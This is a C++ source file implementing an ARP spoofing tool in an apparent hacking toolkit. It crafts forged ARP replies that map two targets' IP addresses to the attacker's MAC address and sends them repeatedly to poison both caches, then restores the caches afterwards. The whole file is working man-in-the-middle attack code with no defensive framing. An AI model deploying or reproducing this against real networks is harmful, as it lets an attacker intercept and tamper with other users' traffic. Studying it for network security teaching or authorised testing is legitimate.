#include "ARPSpoofer.h"

#include <iostream>
#include <cstring>
#include <poll.h>
#include <netinet/in.h>
#include <net/if_arp.h>
#include <arpa/inet.h> 
#include <sys/ioctl.h> 
#include <netinet/ether.h> 

CHaks::ARPSpoofer::ARPSpoofer()
{

}

CHaks::ARPSpoofer::~ARPSpoofer()
{

}

int CHaks::ARPSpoofer::GetTargetMACAddr(const int socketFd, const char* interfaceName, const char* srcIPStr, const char* srcMACStr, 
    const char* targetIPStr, char* targetMACStr)
{
    sockaddr_in targetIP{};
    if(inet_pton(AF_INET, targetIPStr, &targetIP.sin_addr) == -1)
    {
        LOG_ERROR(APPLICATION_ERROR, "inet_pton() error");
        return APPLICATION_ERROR;
    }

    ether_addr targetMAC{};
    if(PacketCraft::GetTargetMACAddr(socketFd, interfaceName, targetIP, targetMAC, 10'000) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "GetTargetMACAddr() error");
        return APPLICATION_ERROR;
    }

    if(ether_ntoa_r(&targetMAC, targetMACStr) == nullptr)
    {
        LOG_ERROR(APPLICATION_ERROR, "ether_ntoa_r() error");
        return APPLICATION_ERROR;
    }

    return NO_ERROR;
}

int CHaks::ARPSpoofer::CreateARPReply(const ether_addr& srcMAC, const ether_addr& dstMAC, const sockaddr_in& srcIP, const sockaddr_in& dstIP, 
    PacketCraft::Packet& packet)
{
    packet.ResetPacketBuffer();

    packet.AddLayer(PC_ETHER_II, ETH_HLEN);
    EthHeader* ethHeader = (EthHeader*)packet.GetLayerStart(0);
    memcpy(ethHeader->ether_shost, srcMAC.ether_addr_octet, ETH_ALEN);
    memcpy(ethHeader->ether_dhost, dstMAC.ether_addr_octet, ETH_ALEN);
    ethHeader->ether_type = htons(ETH_P_ARP);

    packet.AddLayer(PC_ARP, sizeof(ARPHeader));
    ARPHeader* arpHeader = (ARPHeader*)packet.GetLayerStart(1);
    arpHeader->ar_hrd = htons(ARPHRD_ETHER);
    arpHeader->ar_pro = htons(ETH_P_IP);
    arpHeader->ar_hln = ETH_ALEN;
    arpHeader->ar_pln = IPV4_ALEN;
    arpHeader->ar_op = htons(ARPOP_REPLY);
    memcpy(arpHeader->ar_sha, srcMAC.ether_addr_octet, ETH_ALEN);
    memcpy(arpHeader->ar_sip, &srcIP.sin_addr.s_addr, IPV4_ALEN);
    memcpy(arpHeader->ar_tha, dstMAC.ether_addr_octet, ETH_ALEN);
    memcpy(arpHeader->ar_tip, &dstIP.sin_addr.s_addr, IPV4_ALEN);

    return NO_ERROR;
}

int CHaks::ARPSpoofer::CreateARPReply(const char* srcMACStr, const char* dstMACStr, const char* srcIPStr, const char* dstIPStr,
    PacketCraft::Packet& packet)
{
    ether_addr srcMAC{};
    ether_addr dstMAC{};
    sockaddr_in srcIP{};
    sockaddr_in dstIP{};

    if(ether_aton_r(srcMACStr, &srcMAC) == nullptr)
    {
        LOG_ERROR(APPLICATION_ERROR, "ether_aton_r() error!");
        return APPLICATION_ERROR;
    }

    if(ether_aton_r(dstMACStr, &dstMAC) == nullptr)
    {
        LOG_ERROR(APPLICATION_ERROR, "ether_aton_r() error!");
        return APPLICATION_ERROR;
    }

    if(inet_pton(AF_INET, srcIPStr, &srcIP.sin_addr) <= 0)
    {
        LOG_ERROR(APPLICATION_ERROR, "inet_pton() error!");
        return APPLICATION_ERROR;
    }

    if(inet_pton(AF_INET, dstIPStr, &dstIP.sin_addr) <= 0)
    {
        LOG_ERROR(APPLICATION_ERROR, "inet_pton() error!");
        return APPLICATION_ERROR;
    }

    return CreateARPReply(srcMAC, dstMAC, srcIP, dstIP, packet);
}

int CHaks::ARPSpoofer::Spoof(const int socketFd, const char* interfaceName, const char* yourIP, const char* yourMAC, 
    const char* target1IPStr, const char* target1MACStr, const char* target2IPStr, const char* target2MACStr, const bool32 spoofBoth)
{
    PacketCraft::Packet packet;
    if(CreateARPReply(yourMAC, target1MACStr, target2IPStr, target1IPStr, packet) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "CreateARPReply() error!");
        return APPLICATION_ERROR;
    }

    if(packet.Send(socketFd, interfaceName, 0) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "PacketCraft::Packet::Send() error!");
        return APPLICATION_ERROR;
    }
    
    std::cout << "sending ARP packet to " << target1MACStr << " (" << target1IPStr << "): " << yourMAC 
    << " is at " << target2IPStr << " (press enter key to stop)" << "\n";

    if(spoofBoth == TRUE)
    {
        if(CreateARPReply(yourMAC, target2MACStr, target1IPStr, target2IPStr, packet) == APPLICATION_ERROR)
        {
            LOG_ERROR(APPLICATION_ERROR, "CreateARPReply() error!");
            return APPLICATION_ERROR;
        }

        if(packet.Send(socketFd, interfaceName, 0) == APPLICATION_ERROR)
        {
            LOG_ERROR(APPLICATION_ERROR, "PacketCraft::Packet::Send() error!");
            return APPLICATION_ERROR;
        }


        std::cout 
            << "sending ARP packet to " << target2MACStr << " (" << target2IPStr << "): " << yourMAC 
            << " is at " << target1IPStr << " (press enter key to stop)" << "\n";
    }

    return NO_ERROR;
}

int CHaks::ARPSpoofer::SpoofLoop(const int socketFd, const char* interfaceName, const char* yourIP, const char* yourMAC, 
    const char* target1IPStr, const char* target1MACStr, const char* target2IPStr, const char* target2MACStr, const bool32 spoofBoth)
{
    pollfd pollFds[1]{};
    pollFds[0].fd = 0;      
    pollFds[0].events = POLLIN;

    std::cout << "\nSpoofing...press enter to stop\n\n";

    while(true)
    {
        int nEvents = poll(pollFds, sizeof(pollFds) / sizeof(pollFds[0]), ARP_SPOOF_FREQUENCY_MS);
        if(nEvents == -1)
        {
            LOG_ERROR(APPLICATION_ERROR, "poll() error!");
            return APPLICATION_ERROR;
        }
        else if(nEvents == 0)
        {
            if(Spoof(socketFd, interfaceName, yourIP, yourMAC, target1IPStr, target1MACStr, target2IPStr, target2MACStr, spoofBoth) == APPLICATION_ERROR)
            {
                LOG_ERROR(APPLICATION_ERROR, "Spoof() error!");
                return APPLICATION_ERROR;
            }
        }
        else
        {
            if(pollFds[0].revents & POLLIN)
            {
                std::cout << "stopping..." << std::endl;
                break;
            }
        }
    }

    return NO_ERROR;
}

int CHaks::ARPSpoofer::RestoreTargets(const int socketFd, const char* interfaceName, const char* yourIP, const char* yourMAC, 
    const char* target1IPStr, const char* target1MACStr, const char* target2IPStr, const char* target2MACStr, const bool32 spoofBoth)
{
    PacketCraft::Packet packet;
    if(CreateARPReply(target2MACStr, target1MACStr, target2IPStr, target1IPStr, packet) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "CreateARPReply() error!");
        return APPLICATION_ERROR;
    }

    if(packet.Send(socketFd, interfaceName, 0) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "PacketCraft::Packet::Send() error!");
        return APPLICATION_ERROR;
    }

    if(spoofBoth == TRUE)
    {
        if(CreateARPReply(target1MACStr, target2MACStr, target1IPStr, target2IPStr, packet) == APPLICATION_ERROR)
        {
            LOG_ERROR(APPLICATION_ERROR, "ARPPacket::Create() error!");
            return APPLICATION_ERROR;
        }

        if(packet.Send(socketFd, interfaceName, 0) == APPLICATION_ERROR)
        {
            LOG_ERROR(APPLICATION_ERROR, "PacketCraft::Packet::Send() error!");
            return APPLICATION_ERROR;
        }
    }

    return NO_ERROR;
}

